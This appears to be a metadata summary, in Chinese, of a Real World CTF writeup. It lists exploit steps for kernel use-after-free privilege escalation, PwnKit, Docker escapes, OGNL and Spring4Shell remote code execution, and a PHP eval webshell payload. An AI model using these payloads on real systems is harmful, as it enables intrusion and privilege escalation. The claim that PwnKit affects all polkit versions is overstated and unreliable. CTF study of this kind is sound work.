...
quality: high
full_path: 第五届_Real_World_CTF_体验赛_Writeup.full.md
meta_path: 第五届_Real_World_CTF_体验赛_Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '第五届 Real World CTF 体验赛 Writeup。第五届 RWCTF 体验赛多方向：内核 modprobe_path hijack + PwnKit 提权 + Docker binfmt 逃逸 + OGNL RCE + Spring4Shell。。关键路径：Pwn Digging-into-Kernel-3: Linux 5.19.0 + /dev/rwctf 漏洞驱动 (UAF...'
category: misc
...
contest_type: open
wp_url: https://www.ctfiot.com/91583.html
reasoning_chain:
- Pwn Digging-into-Kernel-3 → 触发点：Linux 5.19.0 + /dev/rwctf 漏洞驱动 (UAF+race+leak)
- 假设：keyring keyctl syscall 喷射 user_key_payload → key_revoke/key_unlink 释放 → 动作：add(0, 0x100) + delete(0) + 50 user_key spray + double free
- 动作：key_read 泄 heap (0xe8) + user_free_payload_rcu (0xf0) → vmlinux 基址
- 假设：改 modprobe_path = /tmp/x → 动作：/tmp/dummy 触发 modprobe → chmod 777 /flag
- LPE PwnKit CVE-2021-4034 → 动作：GCONV_PATH=. + pwnkit.so gconv_init() setuid(0) + system('/bin/sh')
- Docker Escaper-2 → 触发点：binfmt_misc 注册 + sshd motd 触发 host 命令
- Docker Escaper-3 → 触发点：DirtyCow vDSO patch 触发 COW
- BUS Driver → 动作：busctl --system call org.dbus.rwctf SayBoss s /tmp/exp.sh
- Web Wiki-Hacker OGNL RCE → 假设：@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id'))
- ApacheCommandText → 动作：${base64decoder:JHtzY3JpcHQ6...}
- Langurage-Expert → 触发点：pearcmd.php register_argc_argv + config-create + <?=@eval($_POST[a]);?> 写 /tmp/1.php
- Spring4Shell → 动作：class.module.classLoader.resources.context.parent.pipeline.first.pattern + .prefix + .suffix + .appBase=/
failed_attempts:
- modprobe_path 直接尝试 chmod 777 → 失败：必须先 hijack + dummy 模块触发
- Web Wiki-Hacker 直接 script 标签 → 失败：必须 OGNL 表达式
- Spring4Shell 改 web.xml → 失败：必须 appBase=C 绕过
key_observations:
- 内核 modprobe_path 持久提权是现代 Linux LPE 经典套路
- PwnKit CVE-2021-4034 影响所有 polkit 版本
- Spring4Shell class.module.classLoader pipeline 改写 appBase 绕过路径限制
- keyring UAF 是 Linux 内核漏洞利用经典模式
- DirtyCow vDSO patch 触发 COW 是容器逃逸通用方法
prerequisites:
- Linux 内核漏洞利用（keyring UAF + modprobe_path）
- PwnKit CVE-2021-4034 提权
- OGNL 表达式注入 + Spring4Shell
- Docker 容器逃逸（binfmt_misc + DirtyCow）
---
